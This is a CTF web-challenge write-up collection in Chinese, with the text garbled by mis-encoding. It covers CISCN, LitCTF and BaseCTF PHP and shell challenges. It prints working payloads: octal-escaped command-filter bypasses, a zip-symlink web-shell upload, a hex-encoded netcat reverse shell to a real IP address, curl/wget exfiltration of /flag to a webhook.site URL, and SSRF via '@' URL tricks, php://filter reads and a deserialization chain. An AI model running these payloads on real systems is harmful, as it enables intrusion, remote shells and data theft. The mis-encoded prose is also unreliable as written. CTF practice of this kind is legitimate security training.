-læ˜¯ç”¨äºåˆ—å‡ºç›®å½•å†…å®¹çš„å‘½ä»¤ï¼Œå…¶ä¸­lsè¡¨ç¤ºåˆ—å‡ºç›®å½•å†…å®¹ï¼Œè€Œ-lè¡¨ç¤ºä»¥é•¿æ ¼å¼æ˜¾ç¤ºã€‚åœ¨ä½ æä¾›çš„è¡¨è¾¾å¼$&#39;\\154\\163\\40\\55\\154&#39;ä¸­ï¼Œ\\ç”¨äºè½¬ä¹‰å­—ç¬¦ï¼Œè¿™äº›åæ–œæ åé¢è·Ÿç€çš„æ•°å­—è¡¨ç¤ºäº†å¯¹åº”å­—ç¬¦çš„ ASCII ç å€¼ã€‚è€Œ\\154å¯¹åº”äºå…«è¿›åˆ¶ASCIIç ï¼Œå…¶åè¿›åˆ¶å€¼ä¸º108ï¼Œè¡¨ç¤ºå­—ç¬¦lï¼›\\163å¯¹åº”äºå­—ç¬¦sï¼›\\40å¯¹åº”äºASCIIç å€¼ä¸º32çš„ç©ºæ ¼å­—ç¬¦ï¼›\\55å¯¹åº”äºASCIIç å€¼ä¸º45çš„å‡å·å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯-ã€‚å› æ­¤ï¼Œè¡¨è¾¾å¼$&#39;\\154\\163\\40\\55\\154&#39;ç­‰åŒäºls -lã€‚\nä¸Šè¿°æ˜¯å…«è¿›åˆ¶\nå½“å¯ç”¨å­—ç¬¦åªæœ‰0 å’Œ 1 æ—¶\n\nå¯ä»¥åˆ©ç”¨\n\næ¥å®ç°æ„é€ ç›®æ ‡å…«è¿›åˆ¶æ•°å­—\nç”¨ä½ç§»è¿ç®—æ„é€ æ•°å­—äºŒ\n\n1 &lt;&lt; 1 æ˜¯ä¸€ä¸ªä½ç§»è¿ç®—ï¼Œè¡¨ç¤ºå°†äºŒè¿›åˆ¶æ•° 1 å‘å·¦ç§»åŠ¨ 1 ä½ã€‚åœ¨ä½ç§»è¿ç®—ä¸­ï¼Œå‘å·¦ç§»åŠ¨æ„å‘³ç€åœ¨æ•°å­—çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­å‘å·¦ç§»åŠ¨æŒ‡å®šçš„ä½æ•°ï¼Œç©ºå‡ºçš„ä½æ•°ç”¨0å¡«å……ã€‚å› æ­¤ï¼Œ1 çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯ 0001ï¼Œå°†å…¶å‘å·¦ç§»åŠ¨ 1 ä½åï¼Œå˜æˆäº† 0010ã€‚ç»“æœæ˜¯2\nåæ–œæ åˆ™æ˜¯\n\nç»“åˆåˆ©ç”¨payload:\n$\\â€˜\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;\næœ€åä¸€ä¸ªåæ–œæ ç¡®ä¿æ•´ä¸ªå‘½ä»¤çš„ç»“æŸå­—ç¬¦ \\\nç¬¬ä¸€ä¸ª \\ æ˜¯å°†**â€™\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;è½¬è¯‘ä¸ºâ€˜\\154\\163â€™**\n\nç©ºæ ¼è¢«è¿‡æ»¤ ${IFS}æ— æ•ˆæ—¶\nå¯ä»¥è¿™æ ·æ„é€ \n\n\nç”±äºä¸èƒ½å­˜åœ¨ç©ºæ ¼\næ‰€ä»¥eval {ls,&#x2F;}ä»æ— æ•ˆ\nåˆ©ç”¨è„šæœ¬æ„é€ \n\n\npayload:\n$â€™\\142\\141\\163\\150â€™&lt;&lt;&lt;$â€™\\173\\154\\163\\54\\57\\175â€™ bash&lt;&lt;&lt;{ls,&#x2F;}\n$â€™\\142\\141\\163\\150â€™&lt;&lt;&lt;$â€™\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175â€™  bash&lt;&lt;&lt;{cat,&#x2F;flag}\n\nCISCN2023å‰ç½®çŸ¥è¯†\nlinuxå‘½ä»¤ è½¯é“¾æ¥  ln -så¦‚å›¾åœ¨ 122ç›®å½•ä¸‹å­˜åœ¨æ–‡ä»¶233\nè¿”å›å…¶ä»–ç›®å½•åˆ›å»ºè½¯é“¾æ¥ ln -s 1&#x2F;\\122&#x2F;233 lj\n\nå³å¯åœ¨å…¶ä»–ç›®å½•æŸ¥çœ‹æ–‡ä»¶å†…å®¹\nåŒç†ä¹Ÿå¯ä»¥æŒ‡å®šç›®å½•ï¼Œä¸‹é¢é¢˜ç›®ç”¨åˆ°\n\n\nUnzip\né˜…è¯»ä»£ç å‘ç°å›å…ˆè¿›å…¥åˆ°&#x2F;tmpç›®å½•å†è¿›è¡Œè§£å‹\næ‰€ä»¥æˆ‘ä»¬è¦ä¸Šä¼ zipæ–‡ä»¶\n1.å…ˆåˆ›å»ºè½¯é“¾æ¥ ln -s &#x2F;var&#x2F;www&#x2F;html slj\n2.å°†è½¯é“¾æ¥æ‰“åŒ…åå°†æœ¬ä½“åˆ é™¤\n3.åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•\n4.è¿›å…¥ç›®å½•åˆ›å»ºæœ¨é©¬\n5.å°†åŒåç›®å½•æ‰“åŒ…\n6.ä¸Šä¼ ä¸¤ä¸ªå‹ç¼©åŒ…\n\n7.url&#x2F;shell.phpè¿æ¥èšå‰‘å³å¯\n\nCISCN2024simple php\nå‘ç°**$cmdåµŒå¥—åœ¨systemå‡½æ•°ä¸­ï¼Œä¸æ˜¯evalå‡½æ•°ä¸­**ï¼Œæ‰€ä»¥æ­¤æ—¶çš„å‘½ä»¤ä¼šä¼ å…¥å‘½ä»¤è¡Œä¸­ï¼Œè¦ä»¥å‘½ä»¤è¡Œï¼ˆç»ˆç«¯ï¼‰çš„è§’åº¦æ¥æ‰§è¡Œ\nå‘½ä»¤è¡Œè¿è¡Œphpä»£ç é˜…è¯»é¢˜å¹²å‘ç°æ— æ³•æ­£å¸¸ä¼ å…¥å‘½ä»¤ï¼ˆè¢«è¿‡æ»¤ï¼‰å…«è¿›åˆ¶ä¹Ÿæ— æ•ˆæœï¼ˆå¼•å·è¢«banï¼‰\nå¯ä»¥ç»“åˆphpä¸­çš„hex2binå‡½æ•°æ¥ä¼ å…¥16è¿›åˆ¶å‘½ä»¤  \n6c73202f &#x2F;&#x2F; ls &#x2F;  å¯ä»¥æ ¹æ®æ€è·¯æ„é€ åå¼¹shellå‘½ä»¤\n\n6e632034372e39392e34332e33382037383738202d65202f62696e2f7368 &#x2F;&#x2F; nc 47.99.43.38 7878 -e &#x2F;bin&#x2F;sh\n1.system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));\n2.system(hex2bin(substr(â€˜6e632034372e39392e34332e33382037383738202d65202f62696e2f7368â€™,0)));\nç»è¿‡å®éªŒå¯å¾—ï¼Œä»¥ä¸Šä¸¤ç§æ–¹æ³•å‡å¯åå¼¹shell,1 çš„ä¼˜åŠ¿æ˜¯å¯ä»¥ç»•è¿‡å¼•å·ä½¿ç”¨\npayload:\ncmd&#x3D;php -r system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));\næˆåŠŸåå¼¹åå‘ç°æ— flagç›®å½•ï¼Œè¿™é‡Œçœ‹wpæ‰çŸ¥é“ï¼Œflagå¯èƒ½åœ¨æ•°æ®åº“ä¸­\nå°±è¦åœ¨åå¼¹çš„shellä¸­è¿›è¡Œmysqlæ•°æ®åº“è¿æ¥\næƒ³åŠæ³•çŸ¥é“ç”¨æˆ·åå’Œå¯†ç æ˜¯ä»€ä¹ˆï¼Œæœ€ç®€å•çš„å°±æ˜¯å¼±å£ä»¤\nå°è¯• root rootåå‘ç°è¿æ¥æˆåŠŸ\npayload:\n\n\nLitCTF2024èšå‰‘æµé‡åˆ†æç‰¹å¾1.æ˜æ˜¾çš„ç‰¹å¾ä¸º**@ini_set(â€œdisplay_errorsâ€ï¼Œâ€0â€);@set_time_limit(0)å¼€å¤´**\n\n2.ä½¿ç”¨base64æˆ–æ–‡æœ¬è½¬16è¿›åˆ¶åŠ å¯†çš„payload\nå¹¶ä¸”é™„æœ‰æ··æ·†éšæœºæ•°ï¼Œbase64ä¸­è¿˜æœ‰æ··æ·†å­—ç¬¦ï¼ˆå‰ä¸¤ä¸ªï¼‰ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬åˆ é™¤æµé‡ä¿¡æ¯ä¸­çš„å‰ä¸¤ä¸ªå­—ç¬¦åæ‰èƒ½å¾—åˆ°æ— æ··æ·†base64ã€‚\neg:\næ ¼å¼ä¸€èˆ¬ä¸º\n&amp;éšæœºæ•°&#x3D;16è¿›åˆ¶åŠ å¯†æ•°æ®   ä¸Šå›¾ï¼š\n\n&amp;éšæœºæ•°&#x3D;xx base64åŠ å¯†æ•°æ®    xxä»£è¡¨ä¸¤ä½æ··æ·†å­—ç¬¦   ä¸Šå›¾ï¼š\n\nLit2023zipä¼ªåŠ å¯† ç‰¹å¾1.å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº 50 4B 03 04 14 00 00 09\n2.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº 50 4B 01 02 1F 00 14 00 01 \nä¿®æ”¹æ–¹æ³•\nåŠ ç²—éƒ¨åˆ†çš„ 01 00 æˆ– 09 00  æ”¹ä¸º 00 00å³å¯\nBaseCTF1z_php12345678910111213141516171819202122232425262728293031323334353637&lt;?phphighlight_file(&#x27;index.php&#x27;);# æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ$emp=$_GET[&#x27;e_m.p&#x27;];$try=$_POST[&#x27;try&#x27;];if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)&#123;    for ($i=0;$i&lt;strlen($emp);$i++)&#123;        if (ctype_alpha($emp[$i]))&#123;            die(&quot;ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼&quot;);        &#125;    &#125;    echo &quot;åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼&quot;.&quot;&lt;br&gt;&quot;;    if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;        die(&quot;ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ&quot;);    &#125;    if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;        die(&quot;ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ&quot;);    &#125;    $a=$_GET[&#x27;a&#x27;];    $b=$_GET[&#x27;b&#x27;];    $c=$_GET[&#x27;c&#x27;];    if(stripos($b,&#x27;php&#x27;)!==0)&#123;        die(&quot;æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼&quot;);    &#125;    echo (new $a($b))-&gt;$c();&#125;else&#123;    die(&quot;114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ&quot;);&#125;# è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~$shell=$_POST[&#x27;shell&#x27;];eval($shell);?&gt;\n\nç¬¬ä¸€éƒ¨åˆ†12345678if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)&#123;    for ($i=0;$i&lt;strlen($emp);$i++)&#123;        if (ctype_alpha($emp[$i]))&#123;            die(&quot;ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼&quot;);        &#125;    &#125;    echo &quot;åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼&quot;.&quot;&lt;br&gt;&quot;;\n\néæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™e_m.p -&gt;e[m.p\nintvalå’Œctype_alphaç»•è¿‡GET: e[m.p&#x3D;114514.1 \n\n114514aä¼šè¢«ctype_alphaæ£€æŸ¥ï¼Œä¸å¯ç”¨\n\nç¬¬äºŒéƒ¨åˆ†123456if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;       die(&quot;ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ&quot;);   &#125;   if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;       die(&quot;ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ&quot;);   &#125;\n\npreg_matchå’Œ!striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡123a=&#x27;*&#x27;b=&#x27;HACKER&#x27;print(a*1000001+b)\n\n\nps:é•¿åº¦ç»•è¿‡ä¸€èˆ¬ä¸ºä¸€ç™¾ä¸‡ä½ï¼Œå»ºè®®ä½¿ç”¨bpé‡å‘å™¨å‘é€\n\nç¬¬ä¸‰éƒ¨åˆ†123456789101112    $a=$_GET[&#x27;a&#x27;];    $b=$_GET[&#x27;b&#x27;];    $c=$_GET[&#x27;c&#x27;];    if(stripos($b,&#x27;php&#x27;)!==0)&#123;        die(&quot;æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼&quot;);    &#125;    echo (new $a($b))-&gt;$c();&#125;else&#123;    die(&quot;114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ&quot;);&#125;\n\nPHPåŸç”Ÿç±»ä¹‹SplFileObjectGET:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString\n\nc&#x3D;__toStringæ˜¯è®©echoè§¦å‘__toStringæ–¹æ³•\n\nEXP123import requestsres = requests.post(&quot;http://gz.imxbt.cn:20214/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;c=__tostring&quot;, data=&#123;&#x27;try&#x27;: &#x27;-&#x27; * 1000001 + &#x27;HACKER&#x27;&#125;)print(res.text)\n\nReally EZ POPpopé“¾å¾ˆå¥½æ„é€ \nexp\n12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Sink&#123;    private $cmd = &#x27;system(&quot;ls&quot;);&#x27;;&#125;class Shark&#123;    private $word;    public function setWord($word) //1 $Si    &#123;        $this-&gt;word = $word;    &#125;&#125;class Sea&#123;    public $animal; //2 $Sh&#125;class Nature&#123;    public $sea;  //3 $Se&#125;$Si=new Sink;$Sh=new Shark;$Se=new Sea;$N=new Nature;$Sh -&gt;setWord($Si);$Se -&gt;animal=$Sh;$N -&gt;sea=$Se;echo serialize($N);\n\nphpç±»ä¸­çš„ç§æœ‰å±æ€§è€ƒç‚¹ï¼Œæ˜¯ä½ç‰ˆæœ¬çš„phpç±»ä¸­çš„ç§æœ‰å±æ€§è¿›è¡Œåºåˆ—åŒ–çš„æ–¹æ³•\n123456789class Shark&#123;    private $word;    public function setWord($word) //1 $Si    &#123;        $this-&gt;word = $word;    &#125;&#125;\n\nåœ¨Sharkä¸­çš„ç§æœ‰å±æ€§wordç›´æ¥ä½¿ç”¨$Sh -&gt;word=$Si;ä¼šæŠ¥é”™ï¼Œéœ€è¦è‡ªå·±æ„é€ ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯setword,æ„é€ é“¾å­æ—¶æ”¹ä¸º$Sh -&gt;setWord($Si);å³å¯ï¼Œå…¶ä»–æ–¹æ³•ä¸å˜\nç©åŸç¥ç©çš„1234567891011121314151617181920212223242526272829303132333435&lt;?phphighlight_file(__FILE__);error_reporting(0);include &#x27;flag.php&#x27;;if (sizeof($_POST[&#x27;len&#x27;]) == sizeof($array)) &#123;  ys_open($_GET[&#x27;tip&#x27;]);&#125; else &#123;  die(&quot;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ&quot;);&#125;function ys_open($tip) &#123;  if ($tip != &quot;æˆ‘è¦ç©åŸç¥&quot;) &#123;    die(&quot;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­&quot;);  &#125;  dumpFlag();&#125;function dumpFlag() &#123;  if (!isset($_POST[&#x27;m&#x27;]) || sizeof($_POST[&#x27;m&#x27;]) != 2) &#123;    die(&quot;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;);  &#125;  $a = $_POST[&#x27;m&#x27;][0];  $b = $_POST[&#x27;m&#x27;][1];  if(empty($a) || empty($b) || $a != &quot;100%&quot; || $b != &quot;love100%&quot; . md5($a)) &#123;    die(&quot;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;);  &#125;  include &#x27;flag.php&#x27;;  $flag[] = array();  for ($ii = 0;$ii &lt; sizeof($array);$ii++) &#123;    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);  &#125;    echo json_encode($flag);&#125;\n\nç¬¬ä¸€éƒ¨åˆ†sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)å¯ä»¥å…ˆåœ¨æœ¬åœ°çœ‹ä¸€ä¸‹sizeof($_POST[&#39;len&#39;])çš„è¿”å›å€¼æ˜¯ä»€ä¹ˆ\n12345678&lt;?phpif (isset($_POST[&#x27;len&#x27;])) &#123;    $lenCount = sizeof($_POST[&#x27;len&#x27;]);    echo &quot;Length of len array: &quot; . $lenCount; // åº”è¯¥è¾“å‡º 45&#125; else &#123;    echo &quot;&#x27;len&#x27; parameter is not set.&quot;;&#125;?&gt;\n\n\nå¯è§POSTä¼ å‡ æ¬¡lenè¿”å›å€¼å°±æ˜¯å‡ \nè¿™é‡Œå¹¶ä¸çŸ¥é“sizeof($array)é•¿åº¦æ˜¯å¤šå°‘ï¼Œè¿›è¡Œçˆ†ç ´è¯•å‡ºæ¥æ˜¯45ï¼Œpayload:\n12POST:len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=44\n\nç¬¬äºŒéƒ¨åˆ†è¿‡äºç®€å•ï¼Œç›´æ¥ç»™payload\n1234GET:?tip=æˆ‘è¦ç©åŸç¥POST:len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=45&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966\n\nç¬¬ä¸‰éƒ¨åˆ†12345678 include &#x27;flag.php&#x27;;  $flag[] = array();  for ($ii = 0;$ii &lt; sizeof($array);$ii++) &#123;    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);  &#125;    echo json_encode($flag);&#125;\n\nå°†è¾“å‡ºçš„å¯†æ–‡è¿›è¡Œè§£å¯†\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$md5 = [    &quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;, &quot;26657d5ff9020d2abefe558796b99584&quot;,    &quot;73278a4a86960eeb576a8fd4c9ec6997&quot;, &quot;ec8956637a99787bd197eacd77acce5e&quot;,    &quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;, &quot;43ec517d68b6edd3015b3edc9a11367b&quot;,    &quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;, &quot;c8ffe9a587b126f152ed3d89a146b445&quot;,    &quot;f457c545a9ded88f18ecee47145a72c0&quot;, &quot;03afdbd66e7929b125f8597834fa83a4&quot;,    &quot;093f65e080a295f8076b1c5722a46aa2&quot;, &quot;03afdbd66e7929b125f8597834fa83a4&quot;,    &quot;698d51a19d8a121ce581499d7b701668&quot;, &quot;d82c8d1619ad8176d665453cfb2e55f0&quot;,    &quot;b53b3a3d6ab90ce0268229151c9bde11&quot;, &quot;9f61408e3afb633e50cdf1b20de6f466&quot;,    &quot;7f39f8317fbdb1988ef4c628eba02591&quot;, &quot;07e1cd7dca89a1678042477183b7ac3f&quot;,    &quot;a1d0c6e83f027327d8461063f4ac58a6&quot;, &quot;7f6ffaa6bb0b408017b62254211691b5&quot;,    &quot;d67d8ab4f4c10bf22aa353e27879133c&quot;, &quot;9f61408e3afb633e50cdf1b20de6f466&quot;,    &quot;e369853df766fa44e1ed0ff613f563bd&quot;, &quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;,    &quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;, &quot;3416a75f4cea9109507cacd8e2f2aefc&quot;,    &quot;b53b3a3d6ab90ce0268229151c9bde11&quot;, &quot;1c383cd30b7c298ab50293adfecb7b18&quot;,    &quot;3416a75f4cea9109507cacd8e2f2aefc&quot;, &quot;da4fb5c6e93e74d3df8527599fa62642&quot;,    &quot;c8ffe9a587b126f152ed3d89a146b445&quot;, &quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;,    &quot;735b90b4568125ed6c3f678819b6e058&quot;, &quot;14bfa6bb14875e45bba028a21ed38046&quot;,    &quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;, &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;,    &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;, &quot;98f13708210194c475687be6106a3b84&quot;,    &quot;3c59dc048e8850243be8079a5c74d079&quot;, &quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;,    &quot;33e75ff09dd601bbe69f351039152189&quot;, &quot;4e732ced3463d06de0ca9a15b6153677&quot;,    &quot;33e75ff09dd601bbe69f351039152189&quot;, &quot;c16a5320fa475530d9583c34fd356ef5&quot;,    &quot;43ec517d68b6edd3015b3edc9a11367b&quot;];// ç”¨äºå­˜å‚¨è¿˜åŸå‡ºçš„å­—ç¬¦$flag = &#x27;&#x27;;for ($i = 0; $i &lt; count($md5); $i++) &#123;    for ($j = 0; $j &lt; 256; $j++) &#123;        // è®¡ç®—å¼‚æˆ–æ“ä½œåçš„å€¼        $xor_result = $j ^ $i;        // è®¡ç®—MD5å€¼        $calculated_md5 = md5($xor_result);        // å¦‚æœè®¡ç®—å‡ºçš„MD5å€¼ä¸ç»™å®šçš„MD5å€¼åŒ¹é…ï¼Œåˆ™æ‰¾åˆ°äº†æ­£ç¡®çš„å­—ç¬¦        if ($calculated_md5 === $md5[$i]) &#123;            $flag .= chr($j);            break;        &#125;    &#125;&#125;echo &quot;Flag: &quot; . $flag . &quot;\\n&quot;;?&gt;\n\nå¬ä¸è§æˆ‘çš„å£°éŸ³æ–¹æ³•ä¸€$(cmd)  åå¼•å·çš„åˆ©ç”¨\näº†è§£åŠŸèƒ½ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°æ®å¤–å¸¦ç½‘ç«™\n123curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`cat /flag`curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/$(cat /flag)wget https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`cat /flag`\n\næ–¹æ³•äºŒå°†å‘½ä»¤å›æ˜¾å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­\n1cat /flag &gt; 1.txt\n\nè®¿é—®1.txtå³å¯\nAuraé…±çš„ç¤¼ç‰©1234567891011121314151617181920212223242526 &lt;?phphighlight_file(__FILE__);// Aura é…±ï¼Œæ¬¢è¿å›å®¶~// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~$pen = $_POST[&#x27;pen&#x27;];if (file_get_contents($pen) !== &#x27;Aura&#x27;)&#123;    die(&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;);&#125;// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~$challenge = $_POST[&#x27;challenge&#x27;];if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)&#123;    die(&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;);&#125;$blog_content = file_get_contents($challenge);if (strpos($blog_content, &#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;) === false)&#123;    die(&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;);&#125;// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~$gift = $_POST[&#x27;gift&#x27;];include($gift); \n\nç¬¬ä¸€éƒ¨åˆ†data:&#x2F;&#x2F;å†™å…¥12345$pen = $_POST[&#x27;pen&#x27;];if (file_get_contents($pen) !== &#x27;Aura&#x27;)&#123;    die(&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;);&#125;\n\npayload:\n12POST:pen=data://text/plain,Aura\n\nç¬¬äºŒéƒ¨åˆ†1234567891011$challenge = $_POST[&#x27;challenge&#x27;];if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)&#123;    die(&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;);&#125;$blog_content = file_get_contents($challenge);if (strpos($blog_content, &#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;) === false)&#123;    die(&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;);&#125; \n\nè¿™é‡Œè¦æ³¨æ„æ˜¯è¿”å›çš„æ˜¯challangeå˜é‡ä¸­çš„ç½‘é¡µå†…å®¹ï¼Œå¹¶ä¸”ç½‘é¡µå†…å®¹æ˜¯ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›çš„\n\nfile_get_contentsè¯¥å‡½æ•°å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å…¶å†…å®¹ï¼Œå¹¶å°†å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›\n\nurl@è§£æè§„åˆ™åœ¨urlä¸­è¾“å…¥http://jasmineaura.github.io@baidu.com, æœ€ç»ˆä¼šè§£æä¸ºåè€…ç½‘ç«™ï¼Œå³ä¸ºhttp://baidu.com \nè§£æ³•ä¸€å°†è‡ªå·±æœåŠ¡å™¨å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åªè¦åŒ…å«å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦å³å¯ï¼Œpost**@æœåŠ¡å™¨åœ°å€&#x2F;xx.txt**\npayload:\n12POST:challenge=http://jasmineaura.github.io@121.43.126.238:8009/1.txt\n\n\nè§£æ³•äºŒç›´æ¥@æœ¬åœ°å›ç¯åœ°å€å³å¯ï¼Œpayload\n123456POST:challenge=http://jasmineaura.github.io@127.0.0.1 0.0.0.0localhostgz.imxbt.cn:20100 é¶åœºç½‘å€\n\nå› ä¸º**@è¿™å‡ ä¸ªç½‘å€æ˜¯è®¿é—®å®ƒæœ¬èº«ï¼Œå¹¶ä¸”è¿™ä¸ªé¶æœºæœ¬èº«å°±åŒ…å«å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦**ï¼Œå³å¯ç»•è¿‡\næœ€ç»ˆpayload12POSTï¼špen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@0.0.0.0&amp;gift=php://filter/convert.base64-encode/resource=flag.php\n\nBack to the futuregitæ–‡ä»¶æ³„éœ²ä½¿ç”¨githacker\n1githacker --url http://gz.imxbt.cn:20119/.git --output 